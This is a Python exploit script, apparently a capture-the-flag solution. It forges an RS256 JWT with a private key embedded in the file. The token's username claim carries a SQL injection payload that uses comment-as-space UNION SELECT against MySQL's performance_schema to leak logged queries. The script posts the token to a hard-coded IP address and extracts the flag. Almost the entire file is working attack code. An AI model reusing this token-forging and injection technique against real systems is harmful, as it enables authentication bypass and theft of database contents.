import jwt
import requests

url = 'http://45.122.249.68:10013/'

private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIByQIBAAJsEOk75AnYhq1Z8+WrGlfJ3Mq2hFtYcImMo+xPyeDrIar9lEEYQ1xc
C4YgAWd4w8AIFm4Sj6cTD09IlAjB+Kp9Dnjh9Fzn2nyuCzQqBSREMseoYNGwt1KH
kvbP4A3qJE2A7gpmInHDWu4Vxd/DAgMBAAECbAwlhm8V4B1SlpBfYMHnv6MYzJNV
zc6ix6NClMcAiPtFW6GMA0jxohWnwx1LFtOKNDq57dzbK/0ojFNdW19VyE7CvMjw
8LZBy4mkAGNmPw/sqa6Te+WfyVLGxU/yJ5ea4CHnQ7RGUDSTEENJQQICA1UCawUT
RxhSL5OPj73xfq4rwO8hhuhl1+qNhSTkLsE9Mw800VsDB5T3Z43QBM2znJcvIL0z
8Smcrvx91Y6Q4kegtZaAHWXZQa6Dp8dWyHv9rdPRFDiq+U/tjTo2Q8n+xh6z697/
0dKD+wEt8Ya3AgFZAmsDcHjxZmCPYu5KDemHJmdspg/CVaHodVcRFQEKOurrFyP4
xSjSLoaid6GJtHodifZpwVVgmamLucqK/mwZljL4doF1j7EPDnEYiRr7y4GM1Vca
v+KL47OdC0ENFfY0wEDLshkCzCXBOt0+KQICAsA=
-----END RSA PRIVATE KEY-----
"""
def gen_jwt():
    token = jwt.encode({"username": "admin'union/**/select/**/1,2,query_sample_text/**/from/**/performance_schema.events_statements_summary_by_digest/**/where/**/query_sample_text/**/like/**/'%Wanna%", 'now': 1632536761.4651732}, private_key, algorithm='RS256')
    # print(str(token))
    return token.decode("utf-8")

def get_flag():
    new_jwt = gen_jwt()
    data = {"jwt":new_jwt}
    r = requests.post(url+'admin', data=data)
    text_res = r.text
    flag = text_res.split(',')
    for i in flag:
        if "Wanna.One{" in i:
            print(i)
            break

get_flag()